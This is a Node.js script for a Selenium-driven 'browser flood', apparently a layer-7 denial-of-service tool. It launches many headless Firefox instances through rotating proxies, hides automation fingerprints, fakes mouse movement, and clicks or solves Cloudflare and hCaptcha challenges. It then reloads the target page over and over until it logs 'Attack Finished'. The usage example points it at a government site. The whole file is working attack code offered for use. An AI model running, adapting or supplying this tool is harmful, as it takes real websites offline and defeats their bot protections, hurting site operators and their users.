 

process.on('uncaughtException', function(er) {
    console.log(er);
});
process.on('unhandledRejection', function(er) {
    console.log(er);
});
require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs');

var webdriver = require('selenium-webdriver');
const { Builder } = require('selenium-webdriver');
const {By, Key, until, EC, WebDriverWait} = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const firefox = require('selenium-webdriver/firefox');
const ie = require('selenium-webdriver/ie');
const safari = require('selenium-webdriver/safari');
const edge = require('selenium-webdriver/edge');
const url = require('url');

//var captcha = require('./captcha.js');


if (process.argv.length != 6){
    //node browser.js https://fbi.gov GET GET proxies.txt 50 20
    console.log('node browser.js <target> <time> <threads> <proxies>');
    console.log('node browser.js https://fbi.gov  2000 30 proxy.txt');
    process.exit(0);
}

function sleep(ms) {
	return new Promise(resolve => setTimeout(resolve, ms));
}

var target_url = process.argv[2];
const target = target_url.split('""')[0];
var time = parseInt(process.argv[3]);
var threads = parseInt(process.argv[4]);
let browsers = ["chrome", "firefox"];
let blacklist = []

var proxies = fs.readFileSync(process.argv[5], 'utf-8').toString().replace(/\r/g, '').split('\n');

let uas = fs.readFileSync("ua.txt", 'utf-8').toString().replace(/\r/g, '').split('\n');
const ua = uas[Math.floor(Math.random() * uas.length)];

function browserManager(browser, option, proxy) {
    if (browser == 'chrome') {
        option = new chrome.Options().addArguments(
            '--disable-blink-features=AutomationControlled', 
            //'--disable-features=IsolateOrigins,site-per-process', 
            //'--renderer-process-limit=1',
            '--ignore-certificate-errors',
            `--proxy-server=http://${proxy}`,
            '--disable-popup-blocking',
            '--ignore-ssl-errors',
            '--enable-javascript',
            '--disable-dev-shm-usage',
            '--disable-infobars',
            '--no-sandbox',
        ).excludeSwitches(["enable-automation"]).setChromeBinaryPath("chromedriver");
        return option;
        //option.addExperimentalOption("useAutomationExtension", false)
    } else if (browser == 'firefox') {
        option = new firefox.Options().headless(true).addArguments(
            '--no-sandbox',
            '--disable-infobars',
            '--disable-dev-shm-usage',
            '--disable-browser-side-navigation',
            `--proxy-server=http://${proxy}`,
            `--user-agent=${ua}`,
            '--enable-javascript',
            '--ignore-ssl-errors',
            '--disable-popup-blocking',
            '--disable-blink-features=AutomationControlled',
        )
        return option;
    }
}

async function captchaHandler(driver, browser, proxy) {
    //*[@id="label"]
    return new Promise(async (resolve, reject) => {
        try { //check for simple captcha
            const element = await driver.findElement(By.css('[value="Verify you are human"]'))
            console.log(`[${proxy} - ${browser}] - Simple Captcha Detected`)
            const actions = driver.actions({bridge: true, async: true});     
            await actions.move({origin:element, duration: Math.floor(Math.random() * 1000)}).click().perform();
            console.log(`[${proxy} - ${browser}] - Simple Captcha Solved`)
            return resolve(element)
        } catch (e) {

        }
        try { //check for checkbox captcha
            let iframes = await driver.findElements(By.tagName('iframe'));
            captcha_iframe = []
            for (i in iframes) {
                captcha_iframe.push(await iframes[i].getAttribute('id'))
            }
            console.log(`${browser.toUpperCase()} (${proxy}) - Switching to hCaptcha iframe (${captcha_iframe[captcha_iframe.length-1]})`)
            await driver.switchTo().frame(driver.findElement(By.id(captcha_iframe[captcha_iframe.length-1])))

            let captchaPath = await driver.findElements(By.css("input"))
            for (i in captchaPath) {
                console.log(await captchaPath[i].getAttribute('type'))
                if (await captchaPath[i].getAttribute('type') == "checkbox") {
                    const actions = driver.actions({bridge: true, async: true});
                    await actions.move({origin:captchaPath[i], duration: Math.floor(Math.random() * 1000)}).click().perform()
                    console.log(`[${proxy} - ${browser}] - Checkbox Captcha Solved`)
                }
            }
            return await resolve()
        } catch (e) {
            console.log(e.message)
        }

        try { //advanced captcha
            await driver.switchTo().defaultContent();
            let hCaptcha_res = await driver.findElements(By.name('h-captcha-response'))
            const CaptchaTextarea = []
            let submit_container = []
            console.log(`[${proxy} - ${browser}] - Advanced captcha detected`)
            let iframes = await driver.findElements(By.tagName('iframe'))
            hCaptcha_iframe = []
            for (i in iframes) {
                if (await iframes[i].isDisplayed() == true) {
                    hCaptcha_iframe.push(iframes[i])
                }
                if (await iframes[i].getAttribute('title') === "Main content of the hCaptcha challenge") {
                    submit_container.push(iframes[i])
                }
            }

            for (x in hCaptcha_res) {
                const res_id = await hCaptcha_res[x].getAttribute('id')
                if (res_id.includes(await hCaptcha_iframe[0].getAttribute('data-hcaptcha-widget-id'))) {
                    CaptchaTextarea.push(hCaptcha_res[x])
                    break
                }
            }
            //switch to main frame
            console.log(`[${proxy} - ${browser}] - switching captcha frames`, await hCaptcha_iframe[0].getAttribute('data-hcaptcha-widget-id'))

            try{
                await driver.switchTo().frame(hCaptcha_iframe[0])
            } catch(e){
                console.log(e.message)
            }

            //await driver.switchTo().frame(driver.findElement(By.id(hCaptcha_iframe[0])))
            console.log(`[${proxy} - ${browser}] - solving captcha`)
            let result = await captcha('key', target, 'hCaptcha')
            console.log(`[${proxy} - ${browser}] - captcha result: ` + result.data)

            await driver.switchTo().defaultContent()
            //console.log('textarea -> ', await CaptchaTextarea[0].getAttribute('id'))
            await driver.executeScript("document.getElementById('" + await CaptchaTextarea[0].getAttribute('id') + "').innerHTML = " + "'" + result.data + "'");
            try{
                await driver.switchTo().frame(hCaptcha_iframe[0])
            } catch(e){
                //console.log('error in switching frames ' + e.message);
            }

            await driver.switchTo().defaultContent()
            try{
                    await driver.switchTo().frame(submit_container[0])
                    let submit_button = await driver.findElements(By.xpath('//div[@role="button"]'))
                    for (x in submit_button) {
                        if (await submit_button[x].getAttribute('class') == 'button-submit button') {
                            await submit_button[x].click()
                            console.log(`[${proxy} - ${browser}] - advanced captcha solved`)
                        }
                    }

            } catch (e) {
                //console.log('error in submit_button ' + e.message)
            }


        } catch (e) {
            //console.log(e.message)
        }
    })
}

async function protectionHandler(driver, proxy, browser) {
    try{
        const title = await driver.getTitle()
        if (title == 'Just a moment...' || 'Checking'.indexOf(title) != -1 || title.includes('One more step')) {
            
        } else {
            return
        }
        for (var i = 0; i < 5; i++) { //retry 5 times
            if (title == 'Just a moment...') {
                console.log(`[${proxy} - ${browser}] - Cloudflare Queue`)

                await sleep(1000);
                await captchaHandler(driver, browser, proxy)
                await driver.navigate().refresh()
            } else if (title.includes('Access denied')) {
                blacklist.push(`${proxy+':'+browser}`)
                console.log(blacklist)
                driver.quit()
            } else {
                break;
            }
        }
        return
    }
    catch(e){
        console.log(e.message)
    }

}

async function startBrowser(browser, option, proxy, time) {
    try{
            let driver = await new webdriver.Builder().forBrowser(browser).setFirefoxOptions(option).build();
            const documentInitialised = () =>
                driver.executeScript('return initialised');

            await driver.manage().setTimeouts( { implicit: 10000 } );

            /*let headers = await driver.findElements(By.css('body'))
            for (i in headers) {
                console.log(await headers[i].getText())
            }*/
            //await driver.get('https://witeboard.com/') for tracking mouse behaviour
            var parsed = url.parse(target);
            console.log(`[${proxy} - ${browser}] - Connected to ${parsed.host}`)
            await driver.get(target.split(" ")[0])
            const actions = driver.actions({bridge: true, async: true});
            const width = await driver.executeScript('return window.innerWidth');
            const height = await driver.executeScript('return window.innerHeight');
            for (var i =0; i < Math.floor(Math.random() * 5); i++){
                var mouseWidth = Math.floor(Math.random() * (width - Math.floor(Math.random() * 100)))
                var mouseHeight = Math.floor(Math.random() * (height - Math.floor(Math.random() * 100)))
                await actions.move({x: mouseWidth, y: mouseHeight, duration: Math.floor(Math.random() * 500)}).perform()
            }

            await actions.move().click().perform()

            await protectionHandler(driver, proxy, browser);

            await driver.switchTo().defaultContent()

            for (let i = 0; i < 10; i++) {
                await driver.navigate().refresh();
            }
            await sleep(time);
            await driver.quit()
    }
    catch (e){
        console.log(`[${proxy} - ${browser}] - Browser fault : ${e.message}`)
        process.exit(0)
    }

}

console.log("starting browser flood for " + time + " seconds");

for (let i = 0; i < threads; i++) {
    setTimeout(function(){
        let option;
        const browser = "firefox" //browsers[Math.floor(Math.random() * browsers.length)]
        var proxy = proxies[Math.floor(Math.random() * proxies.length)];
        options = browserManager(browser, option, proxy)
        console.log(`[${proxy} - ${browser}] - Browser instance started`);
        startBrowser("firefox", options, proxy, time)
    }, 500)
}

setTimeout(function() {
    console.log('Attack Finished')
	process.exit()
}, time * 1000);